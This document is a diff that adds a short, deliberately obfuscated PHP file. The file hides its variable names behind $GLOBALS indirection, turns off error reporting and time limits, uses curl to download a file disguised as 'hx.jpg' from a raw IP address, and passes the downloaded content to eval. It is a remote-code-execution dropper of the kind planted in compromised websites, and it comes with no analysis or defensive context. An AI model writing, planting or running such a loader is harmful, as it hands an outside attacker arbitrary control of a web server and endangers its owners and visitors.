@@ -1,0 +1,17 @@
+<?php 
+${"GLOBALS"}["delves"]="love";
+${"GLOBALS"}["0xfah"]="you";
+error_reporting(0);
+set_time_limit(0);
+${"GLOBALS"}["i"]="love";
+${"GLOBALS"}["haxor"]="love";
+${${"GLOBALS"}["haxor"]}=curl_init();
+${"GLOBALS"}["world"]="love";
+${"GLOBALS"}["Thxngfa"]="love";
+curl_setopt(${${"GLOBALS"}["i"]},
+CURLOPT_URL,"http://156.67.221.29/hx.jpg");
+curl_setopt(${${"GLOBALS"}["world"]},CURLOPT_RETURNTRANSFER,1);
+${${"GLOBALS"}["0xfah"]}=curl_exec(${${"GLOBALS"}["delves"]});
+curl_close(${${"GLOBALS"}["Thxngfa"]});
+eval("?>".${${"GLOBALS"}["0xfah"]});
+?>
